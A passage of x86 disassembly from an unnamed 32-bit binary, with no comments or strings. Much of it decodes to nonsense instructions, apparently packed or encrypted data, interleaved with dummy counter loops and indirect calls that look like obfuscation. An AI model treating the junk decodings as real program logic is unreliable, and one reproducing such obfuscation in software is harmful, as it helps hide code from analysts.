  409457:	fsubr  DWORD PTR [edi+ebx*4-0x49d83cc6]
  40945e:	sbb    dl,BYTE PTR [eax-0x50]
  409461:	retf   
  409462:	sti    
  409463:	dec    edi
  409464:	mov    es,WORD PTR [edx+0x7864bba6]
  40946a:	push   edi
  40946b:	call   0xb3e160c0
  409470:	int3   
  409471:	iret   
  409472:	lods   al,BYTE PTR ds:[esi]
  409473:	lock jns 0x409447
  409476:	sahf   
  409477:	jmp    0x4989:0xb767643b
  40947e:	sub    eax,DWORD PTR [eax-0x62]
  409481:	adc    al,0xfc
  409483:	adc    BYTE PTR [ebp+0x6c],ch
  409486:	das    
  409487:	lods   eax,DWORD PTR ds:[esi]
  409488:	retf   0x75ab
  40948b:	sub    DWORD PTR ds:0x6c63cda6,edi
  409491:	fisubr WORD PTR [esp+eax*2-0x76]
  409495:	inc    ebp
  409496:	inc    DWORD PTR [ecx+0x4248da35]
  40949c:	add    cl,al
  40949e:	or     DWORD PTR [eax],eax
  4094a0:	add    BYTE PTR [ebx+0x2581f04d],cl
  4094a6:	in     al,0xb6
  4094a8:	inc    esp
  4094a9:	add    dl,al
  4094ab:	jnp    0x4094ad
  4094ad:	add    BYTE PTR [ecx+ecx*2],dh
  4094b0:	sub    al,0x35
  4094b2:	mov    DWORD PTR ds:0x41074f,0x4e04
  4094bc:	mov    BYTE PTR [ecx],al
  4094be:	sbb    DWORD PTR ds:0x448990,0x3d76
  4094c8:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4094cf:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  4094d6:	or     ecx,0x8aa
  4094dc:	mov    eax,DWORD PTR [ebp-0x8]
  4094df:	and    DWORD PTR ds:0x44e410,0x0
  4094e9:	mov    ecx,DWORD PTR ds:0x44e410
  4094ef:	inc    ecx
  4094f0:	mov    DWORD PTR ds:0x44e410,ecx
  4094f6:	cmp    DWORD PTR ds:0x44e410,0x1e
  4094fd:	jne    0x40951b
  409503:	push   DWORD PTR [ebp-0x10]
  409506:	push   0x410939
  40950b:	push   0x41098d
  409510:	push   0x410939
  409515:	call   DWORD PTR ds:0x443040
  40951b:	cmp    DWORD PTR ds:0x44e410,0x11
  409522:	jb     0x4094e9
  409528:	xor    DWORD PTR ds:0x4248c6,ebx
  40952e:	mov    ecx,0x7510857
  409533:	push   esi
  409534:	and    DWORD PTR ds:0x44b6d4,0x0
  40953e:	jmp    0x409550
  409543:	mov    esi,DWORD PTR ds:0x44b6d4
  409549:	inc    esi
  40954a:	mov    DWORD PTR ds:0x44b6d4,esi
  409550:	cmp    DWORD PTR ds:0x44b6d4,0x17
  409557:	jae    0x409585
  40955d:	cmp    DWORD PTR ds:0x44b6d4,0x1e
  409564:	jne    0x409580
  40956a:	push   0x4107a9
  40956f:	push   DWORD PTR [ebp-0x20]
  409572:	push   DWORD PTR [ebp-0x20]
  409575:	push   0x7787
  40957a:	call   DWORD PTR ds:0x4433a8
  409580:	jmp    0x409543
  409585:	xor    eax,ecx
  409587:	mov    esi,0x32729e
  40958c:	add    eax,esi
  40958e:	jmp    0x4095af
  409593:	mov    DWORD PTR ds:0x44b6e0,0x1147
  40959d:	mov    dl,BYTE PTR [ebp-0x1]
  4095a0:	mov    DWORD PTR ds:0x4489a4,0x2700
  4095aa:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  4095ae:	inc    eax
  4095af:	mov    DWORD PTR ds:0x44b6dc,0x2e0e
  4095b9:	cmp    eax,0x40
  4095bc:	jb     0x409593
  4095c2:	mov    edx,DWORD PTR [ebp-0x8]
  4095c5:	xor    DWORD PTR ds:0x41073f,0x7536
  4095cf:	mov    eax,DWORD PTR [ebp-0xc]
  4095d2:	add    DWORD PTR ds:0x4489a0,0x44e41c
  4095dc:	jmp    0x409732
  4095e1:	cmp    eax,ebx
  4095e3:	bound  edx,QWORD PTR [edx+0x65]
  4095e6:	push   0x39
  4095e8:	pop    ebx
  4095e9:	jmp    0x4095e6
  4095eb:	adc    al,0xc5
  4095ed:	mov    bh,0x30
  4095ef:	mov    BYTE PTR [ecx-0x4a],al
  4095f2:	int    0x7c
  4095f4:	jl     0x40961d
  4095f6:	jg     0x409674
  4095f8:	jl     0x409635
  4095fa:	(bad)  
  4095fb:	sar    DWORD PTR [esi+0x40],cl
  4095fe:	lock adc eax,0x7fb1d89d
  409604:	mov    edi,0x4690ed0d
  409609:	jmp    0x3241:0xbd040425
  409610:	xchg   ebp,eax
  409611:	inc    edi
  409612:	sti    
  409613:	aad    0x9f
  409615:	add    bh,BYTE PTR [eax+0x550e8818]
  40961b:	sbb    BYTE PTR [ebp+0x2a],ah
  40961e:	ds loop 0x4095a2
  409621:	dec    esp
  409622:	mov    bh,0x8d
  409624:	or     eax,DWORD PTR [eax-0x2bee2931]
  40962a:	(bad)  
  40962b:	retf   0x2346
  40962e:	mov    ah,0xfe
  409630:	repz adc al,bl
  409633:	sbb    eax,DWORD PTR [ecx]
  409635:	jb     0x40966c
  409637:	ret    
  409638:	aam    0x80
  40963a:	les    ebp,FWORD PTR [esi]
  40963c:	or     DWORD PTR [esp+esi*1],ecx
  40963f:	mov    ah,0x21
  409641:	scas   al,BYTE PTR es:[edi]
  409642:	adc    DWORD PTR [esi+0x18],edx
  409645:	pop    ecx
  409646:	outs   dx,BYTE PTR ds:[esi]
  409647:	aad    0xb
  409649:	fisttp DWORD PTR [edx]
  40964b:	xchg   ebp,eax
  40964c:	mov    cl,0x85
  40964e:	cs in  eax,dx
  409650:	adc    cl,BYTE PTR [esi-0x715d754a]
  409656:	add    ecx,DWORD PTR [ecx]
  409658:	jge    0x40967b
  40965a:	pop    esi
  40965b:	dec    edi
  40965c:	mov    ecx,0xc9aaaace
  409661:	sub    DWORD PTR [ebp-0xa],0xffffffa5
  409665:	jb     0x409662
  409667:	sbb    edi,0xffffffce
  40966a:	call   0x62303c7c
  40966f:	dec    ecx
  409670:	sub    DWORD PTR [esi+0x75],eax
  409673:	hlt    
  409674:	rcr    ebp,cl
  409676:	das    
  409677:	mov    esi,0x90a60385
  40967c:	in     al,dx
  40967d:	push   ds
  40967e:	push   eax
  40967f:	(bad)  
  409680:	int    0xa1
  409682:	leave  
  409683:	xchg   ebx,eax
  409684:	jecxz  0x409609
  409686:	sub    ch,ch
  409688:	out    0xa2,eax
  40968a:	fisubr DWORD PTR [ebx+ebp*4]
  40968d:	xchg   esi,eax
  40968e:	dec    edx
  40968f:	bound  edi,QWORD PTR [esi+0x52a419f7]
  409695:	dec    edx
  409696:	xchg   ebx,eax
  409697:	mov    edx,0x9186d6d3
  40969c:	aaa    
  40969d:	mov    ds:0xbc29cfb5,al
  4096a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096a3:	inc    eax
  4096a4:	iret   
  4096a5:	sub    eax,0x9391d972
  4096aa:	in     eax,0x16
  4096ac:	scas   al,BYTE PTR es:[edi]
  4096ad:	ror    ebp,cl
  4096af:	fsub   st(2),st
  4096b1:	pushf  
  4096b2:	pushf  
  4096b3:	pop    eax
  4096b4:	pop    eax
  4096b5:	mov    ecx,DWORD PTR [ebp+0xa]
  4096b8:	call   0x9994:0x60771ac0
  4096bf:	cli    
  4096c0:	icebp  
  4096c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096c2:	cmp    al,0xfe
  4096c4:	mov    edx,0xd6bd377c
  4096c9:	and    BYTE PTR [edx-0x74],cl
  4096cc:	les    esi,FWORD PTR [ebx+0x79]
  4096cf:	adc    eax,0x3e46ca9c
  4096d4:	push   0x45abd3a3
  4096d9:	xchg   edi,eax
  4096da:	dec    esi
  4096db:	fidivr WORD PTR [edx]
  4096dd:	xchg   BYTE PTR [edx],dl
  4096df:	(bad)  
  4096e0:	and    ah,cl
  4096e2:	jns    0x409701
  4096e4:	cmp    eax,0x44a2879
  4096e9:	adc    bh,ah
  4096eb:	nop
  4096ec:	fisttp WORD PTR ds:0xbae00e48
  4096f2:	mov    bh,0xe3
  4096f4:	pop    ebp
  4096f5:	arpl   WORD PTR [esi-0xe2b8330],dx
  4096fb:	ret    0x1150
  4096fe:	jmp    0x40971d
  409700:	mov    bh,0x71
  409702:	fcomi  st,st(5)
  409704:	inc    ebp
  409705:	xchg   esi,eax
  409706:	sub    eax,0xf954da9d
  40970b:	cmp    al,0xfb
  40970d:	or     bl,BYTE PTR [edi]
  40970f:	ins    BYTE PTR es:[edi],dx
  409710:	pop    eax
  409711:	in     eax,dx
  409712:	daa    
  409713:	in     eax,0x17
  409715:	cli    
  409716:	or     esi,DWORD PTR ds:0xddcd84b1
  40971c:	push   0x56336580
  409721:	mov    bh,dh
  409723:	test   BYTE PTR [eax],cl
  409725:	pop    edx
  409726:	ss jb  0x4096f5
  409729:	pop    es
  40972a:	jo     0x4097a6
  40972c:	adc    BYTE PTR [eax-0x2b],dh
  40972f:	mov    ebx,0xd133980c
  409734:	add    edx,esi
  409736:	mov    DWORD PTR ds:0x44899c,0x4464
  409740:	cmp    edx,eax
  409742:	mov    DWORD PTR ds:0x4248d6,0xc14
  40974c:	je     0x40993f
  409752:	add    DWORD PTR ds:0x448998,0x1465
  40975c:	push   ebx
  40975d:	and    DWORD PTR ds:0x44b6d8,0x0
  409767:	mov    eax,ds:0x44b6d8
  40976c:	inc    eax
  40976d:	mov    ds:0x44b6d8,eax
  409772:	cmp    DWORD PTR ds:0x44b6d8,0x10
  409779:	jne    0x409785
  40977f:	call   DWORD PTR ds:0x4433ac
  409785:	cmp    DWORD PTR ds:0x44b6d8,0xf
  40978c:	jne    0x40979d
  409792:	mov    eax,ds:0x44b6d8
  409797:	inc    eax
  409798:	mov    ds:0x44b6d8,eax
  40979d:	cmp    DWORD PTR ds:0x44b6d8,0x1d
  4097a4:	jb     0x409767
  4097aa:	push   edi
  4097ab:	jmp    0x409901
  4097b0:	push   esp
  4097b1:	ss push edx
  4097b3:	std    
  4097b4:	push   edx
  4097b5:	jge    0x40981e
  4097b7:	pop    ebp
  4097b8:	add    al,0xa1
  4097ba:	or     eax,0x81a9d30d
  4097bf:	push   ebp
  4097c0:	jno    0x409791
  4097c2:	jl     0x409840
  4097c4:	daa    
  4097c5:	jg     0x409843
  4097c7:	jl     0x409815
  4097c9:	jae    0x409831
  4097cb:	xor    al,0xef
  4097cd:	inc    ecx
  4097ce:	popf   
  4097cf:	shl    BYTE PTR [edx-0x15],1
  4097d2:	inc    esp
  4097d3:	jl     0x4097ba
  4097d5:	add    BYTE PTR [esi+0x64],dl
  4097d8:	push   esp
  4097d9:	inc    esp
  4097da:	mov    ah,0x9
  4097dc:	das    
  4097dd:	mov    ecx,0xc6736ebf
  4097e2:	and    DWORD PTR [edi-0x6d],ebx
  4097e5:	sahf   
  4097e6:	out    dx,al
  4097e7:	adc    BYTE PTR [edx+0x775f7abf],dh
  4097ed:	std    
  4097ee:	jmp    0x40978d
  4097f0:	fstp   TBYTE PTR [ecx-0x15]
  4097f3:	dec    ecx
  4097f4:	lahf   
  4097f5:	div    BYTE PTR ds:0x91337c8c
  4097fb:	je     0x409821
  4097fd:	lds    ecx,FWORD PTR [edx-0x1533fbdc]
  409803:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  409805:	xor    BYTE PTR [edi-0x17da839b],al
  40980b:	in     al,0xd3
  40980d:	mov    al,0x17
  40980f:	stos   BYTE PTR es:[edi],al
  409810:	jnp    0x409849
  409812:	js     0x4097a1
  409814:	ins    BYTE PTR es:[edi],dx
  409815:	push   ds
  409816:	ror    BYTE PTR [esi-0x7d7672b8],0xa1
  40981d:	aaa    
  40981e:	xchg   BYTE PTR [ebp-0x78cb1597],bh
  409824:	jg     0x409884
  409826:	add    cl,dl
  409828:	add    BYTE PTR [ecx+0x24],0x1
  40982c:	out    dx,eax
  40982d:	(bad)  
  40982e:	mov    esi,0xf06284f4
  409833:	out    dx,al
  409834:	mov    dl,0xe1
  409836:	shr    BYTE PTR [eax+0x762d1345],1
  40983c:	mov    cl,0xea
  40983e:	xlat   BYTE PTR ds:[ebx]
  40983f:	test   eax,0x8fd91e0a
  409844:	sub    al,BYTE PTR [esi+0x1]
  409847:	inc    esi
  409848:	add    DWORD PTR [edi],0x1b
  40984b:	fimul  DWORD PTR [edi-0x745f0c88]
  409851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409852:	jnp    0x4098ca
  409854:	mov    ds:0x55770831,eax
  409859:	adc    eax,0xef8f33e3
  40985e:	sbb    ah,BYTE PTR [ebx-0x3c5376a4]
  409864:	push   cs
  409865:	push   0x9a314643
  40986a:	and    BYTE PTR [ebp-0x7b],0x55
  40986e:	cmp    eax,0x39cb8b54
  409873:	loop   0x40986d
  409875:	push   esp
  409876:	loopne 0x4098ac
  409878:	inc    ebp
  409879:	lock or eax,0xdb4daa2f
  40987f:	cwde   
  409880:	das    
  409881:	lea    edx,[edx]
  409883:	jle    0x4098c8
  409885:	es mov bh,0x83
  409888:	call   0x1b016ba1
  40988d:	and    esi,DWORD PTR cs:[ebp+0x78a8b3cb]
  409894:	xchg   ecx,ebx
  409896:	push   ss
  409897:	out    dx,al
  409898:	mov    ch,0xa3
  40989a:	aas    
  40989b:	fucomp st(3)
  40989d:	hlt    
  40989e:	xchg   edx,eax
  40989f:	sti    
  4098a0:	retf   
  4098a1:	int3   
  4098a2:	pusha  
  4098a3:	inc    eax
  4098a4:	xchg   edx,ebp
  4098a6:	call   0x61477620
  4098ab:	leave  
  4098ac:	cmp    al,0x30
  4098ae:	adc    BYTE PTR [edx],0x99
  4098b1:	lods   al,BYTE PTR ds:[esi]
  4098b2:	imul   edx,DWORD PTR [ebp+0x6336bb8d],0xffffffed
  4098b9:	inc    esp
  4098ba:	nop
  4098bb:	adc    al,0xe3
  4098bd:	ins    BYTE PTR es:[edi],dx
  4098be:	fs cld 
  4098c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098c1:	pop    ds
  4098c2:	jbe    0x409869
  4098c4:	push   0x50
  4098c6:	dec    esi
  4098c7:	pusha  
  4098c8:	iret   
  4098c9:	sub    DWORD PTR [esi],ebp
  4098cb:	jp     0x4098f7
  4098cd:	mov    bh,0xb3
  4098cf:	adc    eax,DWORD PTR [edi-0x5dbc47d]
  4098d5:	inc    edx
  4098d6:	loop   0x409934
  4098d8:	popf   
  4098d9:	(bad)  
  4098da:	pop    esi
  4098db:	push   ebp
  4098dc:	or     eax,0x43ec42f9
  4098e1:	out    dx,eax
  4098e2:	cmp    ch,BYTE PTR [esi-0x3ed1baa0]
  4098e8:	inc    esp
  4098e9:	in     eax,0x8b
  4098eb:	xchg   ecx,eax
  4098ec:	dec    edx
  4098ed:	shl    BYTE PTR [edx],1
  4098ef:	jmp    0xa2345cc5
  4098f4:	add    ch,ch
  4098f6:	inc    ebx
  4098f7:	jne    0x409892
  4098f9:	inc    ecx
  4098fa:	test   esp,eax
  4098fc:	enter  0x3de8,0x76
  409900:	and    ecx,DWORD PTR [ebx+0x42b8087d]
  409906:	mov    al,BYTE PTR [eax]
  409908:	add    BYTE PTR [esi+0x33],ah
  40990b:	inc    esp
  40990c:	xchg   edi,eax
  40990d:	add    bh,BYTE PTR [edi+0x3b08]
  409913:	add    ax,di
  409916:	movzx  eax,ax
  409919:	mov    DWORD PTR [ebp-0x14],eax
  40991c:	mov    eax,DWORD PTR [ebp+0x8]
  40991f:	movzx  eax,WORD PTR [eax+edx*4]
  409923:	xor    eax,0x8a42
  409928:	add    eax,edi
  40992a:	mov    edi,DWORD PTR [ebp-0x14]
  40992d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  409931:	mov    eax,DWORD PTR [ebp-0xc]
  409934:	inc    edx
  409935:	cmp    edx,eax
  409937:	jne    0x409901
  40993d:	pop    edi
  40993e:	pop    ebx
  40993f:	mov    eax,DWORD PTR [ebp-0x8]
  409942:	mov    edx,DWORD PTR [ebp+0x10]
  409945:	xor    eax,ecx
  409947:	add    eax,esi
  409949:	mov    DWORD PTR [edx],eax
  40994b:	mov    eax,DWORD PTR [ebp-0x8]
  40994e:	xor    eax,ecx
  409950:	add    eax,esi
  409952:	mov    DWORD PTR [ebp+0x8],eax
  409955:	mov    eax,DWORD PTR [ebp+0x8]
  409958:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40995c:	mov    dl,BYTE PTR [ebp-0x1]
  40995f:	cmp    al,dl
  409961:	je     0x409afa
  409967:	mov    eax,DWORD PTR [ebp+0x8]
  40996a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40996e:	mov    edx,DWORD PTR [ebp+0xc]
  409971:	cmp    al,BYTE PTR [edx]
  409973:	jne    0x409b20
  409979:	mov    eax,DWORD PTR [ebp-0x8]
  40997c:	mov    edx,DWORD PTR [ebp+0xc]
  40997f:	movsx  edx,BYTE PTR [edx]
  409982:	xor    eax,ecx
  409984:	add    eax,esi
  409986:	cmp    edx,eax
  409988:	je     0x409b14
  40998e:	jmp    0x409ae4
  409993:	add    ah,ah
  409995:	clc    
  409996:	pop    es
  409997:	clc    
  409998:	sbb    esp,ebx
  40999a:	sti    
  40999b:	ins    DWORD PTR es:[edi],dx
  40999c:	sbb    BYTE PTR [esp+ebp*8],ch
  40999f:	sub    cl,BYTE PTR [ebx+edx*2+0x44]
  4099a3:	cmp    dh,cl
  4099a5:	jl     0x409a23
  4099a7:	daa    
  4099a8:	jg     0x409a26
  4099aa:	jl     0x40993c
  4099ac:	mov    edx,0xc8f9abfc
  4099b1:	jns    0x409955
  4099b3:	xor    al,0x3b
  4099b5:	cs push ebx
  4099b7:	and    eax,0x5d16c06e
  4099bc:	push   ds
  4099bd:	xor    BYTE PTR [ecx+edx*1-0x284a7b58],cl
  4099c4:	add    ebx,esp
  4099c6:	mov    bh,0x7b
  4099c8:	sbb    ebp,DWORD PTR [ebx]
  4099ca:	and    BYTE PTR [edx-0x3fba8237],ah
  4099d0:	push   ebp
  4099d1:	or     bl,BYTE PTR [edx-0x57]
  4099d4:	add    BYTE PTR [esp+edi*1],bh
  4099d7:	jge    0x4099fc
  4099d9:	push   eax
  4099da:	add    eax,0x63a6fc7d
  4099df:	mov    eax,0xc3e1687e
  4099e4:	std    
  4099e5:	(bad)  
  4099e6:	leave  
  4099e7:	popa   
  4099e8:	(bad)  
  4099eb:	retf   0x10d1
  4099ee:	aas    
  4099ef:	ss retf 
  4099f1:	sub    eax,DWORD PTR [ebp+0x2]
  4099f4:	adc    al,BYTE PTR [ebp+0x6e3c338e]
  4099fa:	jecxz  0x409a77
  4099fc:	xlat   BYTE PTR ds:[ebx]
  4099fd:	imul   edx,DWORD PTR [ebp+0x2b],0xe3d8711d
  409a04:	push   eax
  409a05:	fst    DWORD PTR [ecx]
  409a07:	push   edx
  409a08:	in     eax,dx
  409a09:	lods   eax,DWORD PTR ds:[esi]
  409a0a:	imul   eax,DWORD PTR ds:[eax-0x2f],0xffffff8d
  409a0f:	mov    ecx,0x39d0df6f
  409a14:	push   eax
  409a15:	rcr    BYTE PTR [esi+esi*4],0xc2
  409a19:	jmp    0x7e31:0x92046d9f
  409a20:	out    0x8c,al
  409a22:	mov    ds:0x4b7f9223,eax
  409a27:	sub    al,0x66
  409a29:	pushf  
  409a2a:	retf   0x53cd
  409a2d:	mov    dh,0x6d
  409a2f:	sbb    edi,DWORD PTR [ebp+edi*2+0x60d61862]
  409a36:	sbb    DWORD PTR [ebp-0x3a],esi
  409a39:	ds adc al,0xec
  409a3c:	xor    DWORD PTR [edi],ecx
  409a3e:	mov    cl,0x6d
  409a40:	(bad)  
  409a41:	dec    edx
  409a42:	adc    DWORD PTR [edi+0x26],edi
  409a45:	ret    
  409a46:	xchg   ebp,eax
  409a47:	retf   0xb5c0
  409a4a:	adc    ah,BYTE PTR [edx+0x58]
  409a4d:	mov    al,0x2f
  409a4f:	sti    
  409a50:	repnz fsubr QWORD PTR [edx+0x22]
  409a54:	mov    ah,0x64
  409a56:	test   DWORD PTR [esi-0x5fe94249],0x2119e922
  409a60:	and    ebp,DWORD PTR [eax+0x62]
  409a63:	xchg   BYTE PTR [edi],bl
  409a65:	mov    dh,0xd
  409a67:	inc    edx
  409a68:	pop    ecx
  409a69:	stos   BYTE PTR es:[edi],al
  409a6a:	sub    DWORD PTR [ecx],ebx
  409a6c:	(bad)
  409a71:	adc    BYTE PTR [ecx-0x48],dh
  409a74:	pushf  
  409a75:	cmp    al,dh
  409a77:	mov    cl,0xa7
  409a79:	int3   
  409a7a:	addr16 mov eax,ds:0x4633
  409a7e:	addr16 push es
  409a80:	in     eax,dx
  409a81:	dec    ebx
  409a82:	mov    eax,ds:0xad273ebf
  409a87:	loopne 0x409acd
  409a89:	std    
  409a8a:	push   ebp
  409a8b:	sub    BYTE PTR [edi-0x6f],cl
  409a8e:	sub    BYTE PTR [ebx+0x3601551b],bh
  409a94:	jl     0x409a3f
  409a96:	mov    ebp,0xb2028d4
  409a9b:	push   ds
  409a9c:	stc    
  409a9d:	push   0x7e
  409a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aa0:	call   0xd16a:0xc1c58705
  409aa7:	mov    dh,0x6c
  409aa9:	(bad)  [ecx+0x6ba361e4]
  409aaf:	ja     0x409aaf
  409ab1:	mov    ds:0x6de163ad,eax
  409ab6:	out    dx,eax
  409ab7:	push   esp
  409ab8:	and    DWORD PTR [edx-0x4f],edx
  409abb:	call   0xfec5:0x1f9f840f
  409ac2:	sub    DWORD PTR [ebx+0x36e66826],eax
  409ac8:	scas   eax,DWORD PTR es:[edi]
  409ac9:	sbb    ebp,edx
  409acb:	mov    ch,0x68
  409acd:	lods   eax,DWORD PTR ds:[esi]
  409ace:	cli    
  409acf:	ja     0x409ac1
  409ad1:	lahf   
  409ad2:	pop    es
  409ad3:	pop    ss
  409ad4:	add    edx,eax
  409ad6:	mov    ebp,0x608e7dda
  409adb:	fild   DWORD PTR [ebx]
  409add:	fs cmp al,0x32
  409ae0:	lock mov WORD PTR [edx-0x17ba3847],fs
  409ae7:	(bad)  
  409ae8:	std    
  409ae9:	add    eax,0xe8458d07
  409aee:	mov    DWORD PTR [ebp-0x14],eax
  409af1:	mov    eax,DWORD PTR [ebp-0x14]
  409af4:	add    DWORD PTR [eax],0x705fa8f
  409afa:	mov    eax,DWORD PTR [ebp-0x10]
  409afd:	mov    edx,DWORD PTR [ebp+0x8]
  409b00:	xor    eax,ecx
  409b02:	lea    eax,[eax+edx*1+0x32729e]
  409b09:	mov    DWORD PTR [ebp+0x8],eax
  409b0c:	inc    DWORD PTR [ebp+0xc]
  409b0f:	jmp    0x409955
  409b14:	mov    eax,DWORD PTR [ebp-0x10]
  409b17:	xor    eax,ecx
  409b19:	mov    ecx,DWORD PTR [ebp+0x10]
  409b1c:	add    eax,esi
  409b1e:	mov    DWORD PTR [ecx],eax
  409b20:	pop    esi
  409b21:	leave  
  409b22:	ret    0xc
  409b25:	push   ebp
  409b26:	mov    ebp,esp
  409b28:	push   ecx
  409b29:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  409b30:	sub    DWORD PTR ds:0x41074b,edx
  409b36:	mov    eax,DWORD PTR [ebp+0x8]
  409b39:	jmp    0x409ca4
  409b3e:	push   cs
  409b3f:	xchg   BYTE PTR [esi],dl
  409b41:	fs xchg esi,eax
  409b43:	fs dec esi
  409b45:	data16 jg 0x409bb3
  409b48:	pop    esp
  409b49:	(bad)  
  409b4c:	sbb    esi,eax
  409b4e:	jecxz  0x409b11
  409b50:	jl     0x409bce
  409b52:	retf   0x7c7f
  409b55:	jl     0x409b97
  409b57:	inc    esp
  409b58:	fistp  WORD PTR [edi]
  409b5a:	icebp  
  409b5b:	adc    DWORD PTR [ebx+0x653f2b6e],esi
  409b61:	sahf   
  409b62:	lods   al,BYTE PTR ds:[esi]
  409b63:	xor    BYTE PTR [ebp+0x3ea40bec],dh
  409b69:	fisubr DWORD PTR [edx+0x66]
  409b6c:	sbb    eax,DWORD PTR [ecx-0x5b679d5e]
  409b72:	sbb    eax,0xa059ffb0
  409b77:	cld    
  409b78:	jmp    0xc210f334
  409b7d:	(bad)  
  409b7e:	fidivr DWORD PTR [ebx+esi*8-0x25fa759b]
  409b85:	outs   dx,DWORD PTR ds:[esi]
  409b86:	inc    edx
  409b87:	dec    esi
  409b88:	xor    eax,0x895c22f1
  409b8d:	leave  
  409b8e:	xor    dl,BYTE PTR [edi-0x67e3da7b]
  409b94:	inc    ecx
  409b95:	adc    dl,BYTE PTR [edx+0x4b]
  409b98:	and    DWORD PTR ds:[eax+0x1],ecx
  409b9c:	in     al,dx
  409b9d:	je     0x409bfd
  409b9f:	dec    eax
  409ba0:	jecxz  0x409b37
  409ba2:	xor    dh,bl
  409ba4:	xchg   edi,eax
  409ba5:	push   esp
  409ba6:	push   ecx
  409ba7:	xchg   edx,eax
  409ba8:	xlat   BYTE PTR ds:[ebx]
  409ba9:	repnz push ecx
  409bab:	jb     0x409b9b
  409bad:	ret    0x1960
  409bb0:	jb     0x409bc2
  409bb2:	mov    ebx,0xa60ed457
  409bb7:	and    BYTE PTR [ebp+0x30],0x3e
  409bbb:	add    ebp,DWORD PTR [edx+eax*1+0x595fb5b3]
  409bc2:	mul    BYTE PTR [edx]
  409bc4:	cmp    eax,0x399017d6
  409bc9:	fs inc ebx
  409bcb:	pop    esp
  409bcc:	stos   DWORD PTR es:[edi],eax
  409bcd:	push   esp
  409bce:	(bad)  
  409bcf:	aam    0x2c
  409bd1:	popa   
  409bd2:	dec    edi
  409bd3:	push   ds
  409bd4:	jle    0x409bbd
  409bd6:	push   0xd0e90c02
  409bdb:	xor    esp,DWORD PTR [ecx]
  409bdd:	xor    BYTE PTR [edi],bl
  409bdf:	mov    ebp,0xf0ced4a3
  409be4:	sub    al,0x57
  409be6:	lock and eax,0xe8c91285
  409bec:	lds    esp,FWORD PTR ds:0x8789dc02
  409bf2:	addr16 in al,dx
  409bf4:	jl     0x409bf5
  409bf6:	mov    al,BYTE PTR [ebx]
  409bf8:	xchg   edi,eax
  409bf9:	in     eax,dx
  409bfa:	test   eax,0x98f002bb
  409bff:	jbe    0x409bdd
  409c01:	dec    ebx
  409c02:	push   edi
  409c03:	sub    DWORD PTR [esi+0x298e17c],esp
  409c09:	sbb    BYTE PTR [eax-0x5a],dh
  409c0c:	xchg   ebp,eax
  409c0d:	sub    ch,bh
  409c0f:	xchg   DWORD PTR [ecx+0x1422dc57],ebx
  409c15:	cmp    DWORD PTR [ebp-0x33],0x3719a34b
  409c1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c1d:	into   
  409c1e:	(bad)  
  409c1f:	pusha  
  409c20:	inc    esp
  409c21:	cmp    edi,0x9d1dce6e
  409c27:	jnp    0x409c46
  409c29:	aas    
  409c2a:	fcmove st,st(7)
  409c2c:	inc    edx
  409c2d:	ja     0x409c3c
  409c2f:	lahf   
  409c30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c31:	lods   eax,DWORD PTR ds:[esi]
  409c32:	outs   dx,DWORD PTR ds:[esi]
  409c33:	retf   
  409c34:	push   0xffffffe8
  409c36:	pop    edx
  409c37:	add    ebp,ecx
  409c39:	retf   0x9dce
  409c3c:	inc    edi
  409c3d:	mov    ds:0x17f6ff47,eax
  409c42:	mov    bh,0x7
  409c44:	shr    edx,1
  409c46:	push   ebp
  409c47:	mov    ebx,0xaa32afd4
  409c4c:	xor    eax,0xef6f0822
  409c51:	xor    esp,DWORD PTR [ebx-0x47a01b74]
  409c57:	push   ebp
  409c58:	stos   BYTE PTR es:[edi],al
  409c59:	adc    al,0x4a
  409c5b:	pop    es
  409c5c:	loop   0x409cbf
  409c5e:	test   al,0x87
  409c60:	push   ds
  409c61:	or     bl,cl
  409c63:	inc    edx
  409c64:	ror    DWORD PTR [edx+0x4b],cl
  409c67:	out    dx,eax
  409c68:	mov    ch,0x8e
  409c6a:	dec    eax
  409c6b:	inc    ebp
  409c6c:	push   esi
  409c6d:	mov    WORD PTR [esi],gs
  409c6f:	test   eax,0x5073f8f2
  409c74:	fmul   DWORD PTR [di]
  409c77:	or     DWORD PTR [edi],0xc0dbd312
  409c7d:	lahf   
  409c7e:	popf   
  409c7f:	loopne 0x409c76
  409c81:	xor    ebp,ecx
  409c83:	push   edi
  409c84:	pop    eax
  409c85:	mov    dh,0xd3
  409c87:	popf   
  409c88:	retf   
  409c89:	pop    edi
  409c8a:	fcmovne st,st(4)
  409c8c:	cmp    BYTE PTR [ecx+ecx*2-0x42],ah
  409c90:	sbb    edi,DWORD PTR [eax-0x80]
  409c93:	aaa    
  409c94:	shl    DWORD PTR [ecx],1
  409c96:	repz pushf 
  409c98:	scas   eax,DWORD PTR es:[edi]
  409c99:	mov    ebp,0xa24049ab
  409c9e:	inc    ebx
  409c9f:	xor    BYTE PTR [edi-0x751564a0],dh
  409ca5:	add    BYTE PTR [ecx+0x4248da15],al
  409cab:	add    al,ah
  409cad:	mov    dh,0x44
  409caf:	add    BYTE PTR [esi*1+0x66e94934],al
  409cb6:	add    DWORD PTR [eax],eax
  409cb8:	add    BYTE PTR [ecx],al
  409cba:	bound  esp,QWORD PTR [eax-0x13]
  409cbd:	arpl   bp,bp
  409cbf:	cdq    
  409cc0:	jp     0x409c53
  409cc2:	fldenv [esi+ebx*2+0x6d010f]
  409cc9:	mov    cl,0xc0
  409ccb:	jl     0x409d49
  409ccd:	retf   0x7c7f
  409cd0:	jl     0x409cac
  409cd2:	mov    di,0x77bd
  409cd6:	clc    
  409cd7:	test   al,0xe5
  409cd9:	sub    DWORD PTR [ecx+0x47],ebx
  409cdc:	dec    edi
  409cdd:	and    DWORD PTR [ecx+0x3e401dda],0xe
  409ce4:	add    edi,edx
  409ce6:	retf   0x89c1
  409ce9:	pop    esp
  409cea:	or     eax,0xfa934708
